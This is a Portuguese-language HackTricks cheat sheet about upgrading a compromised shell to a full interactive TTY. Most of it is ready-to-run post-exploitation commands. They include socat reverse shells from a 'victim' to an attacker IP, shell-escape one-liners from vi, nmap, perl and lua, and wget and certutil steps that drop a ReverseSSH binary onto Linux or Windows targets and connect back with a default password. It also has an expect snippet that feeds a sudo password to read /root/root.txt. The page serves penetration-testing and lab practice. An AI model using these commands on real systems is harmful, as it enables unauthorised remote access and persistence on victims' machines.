# TTY Completo

Observe que o shell que você define na variável `SHELL` **deve** estar **listado dentro** de _**/etc/shells**_ ou `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Além disso, observe que os próximos trechos de código só funcionam no bash. Se você estiver em um zsh, mude para um bash antes de obter o shell executando `bash`.

#### Python

{% code overflow="wrap" %}
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

{% hint style="info" %}
Você pode obter o **número** de **linhas** e **colunas** executando **`stty -a`**
{% endhint %}

#### script

{% code overflow="wrap" %}
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

#### socat

#### Descrição

O socat é um utilitário de rede que estabelece conexões bidirecionais entre dois pontos finais (endpoints), permitindo a transferência de dados entre eles. Ele pode ser usado para criar um shell tty completo em um sistema remoto, permitindo que o invasor execute comandos como se estivesse fisicamente conectado ao sistema.

#### Como usar

Para criar um shell tty completo usando o socat, execute o seguinte comando no sistema remoto:

```
socat TCP-L:<PORT> PTY,raw,echo=0
```

Substitua `<PORT>` pela porta que você deseja usar para a conexão. Em seguida, execute o seguinte comando em sua máquina local para se conectar ao shell tty remoto:

```
socat TCP:<REMOTE_IP>:<PORT> PTY,raw,echo=0
```

Substitua `<REMOTE_IP>` pelo endereço IP do sistema remoto e `<PORT>` pela porta que você especificou anteriormente.

#### Exemplo

No sistema remoto:

```
socat TCP-L:4444 PTY,raw,echo=0
```

Na máquina local:

```
socat TCP:192.168.0.2:4444 PTY,raw,echo=0
```

Isso criará um shell tty completo no sistema remoto e permitirá que você execute comandos como se estivesse fisicamente conectado ao sistema.
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Gerar shells**

* `python -c 'import pty; pty.spawn("/bin/sh")'`
* `echo os.system('/bin/bash')`
* `/bin/sh -i`
* `script -qc /bin/bash /dev/null`
* `perl -e 'exec "/bin/sh";'`
* perl: `exec "/bin/sh";`
* ruby: `exec "/bin/sh"`
* lua: `os.execute('/bin/sh')`
* IRB: `exec "/bin/sh"`
* vi: `:!bash`
* vi: `:set shell=/bin/bash:shell`
* nmap: `!sh`

## ReverseSSH

Uma maneira conveniente para **acesso interativo ao shell**, bem como **transferência de arquivos** e **encaminhamento de portas**, é deixar o servidor ssh estaticamente vinculado [ReverseSSH](https://github.com/Fahrj/reverse-ssh) no alvo.

Abaixo está um exemplo para `x86` com binários comprimidos upx. Para outros binários, verifique a [página de lançamentos](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Prepare localmente para capturar a solicitação de encaminhamento de porta ssh:

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
{% endcode %}

* (2a) Alvo Linux:

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
{% endcode %}

* (2b) Alvo Windows 10 (para versões anteriores, verifique o [leia-me do projeto](https://github.com/Fahrj/reverse-ssh#features)):

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
* Se a solicitação de encaminhamento de porta ReverseSSH foi bem-sucedida, agora você deve ser capaz de fazer login com a senha padrão `letmeinbrudipls` no contexto do usuário que está executando o `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Sem TTY

Se por algum motivo você não conseguir obter um TTY completo, **ainda é possível interagir com programas** que esperam entrada do usuário. No exemplo a seguir, a senha é passada para o `sudo` para ler um arquivo:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
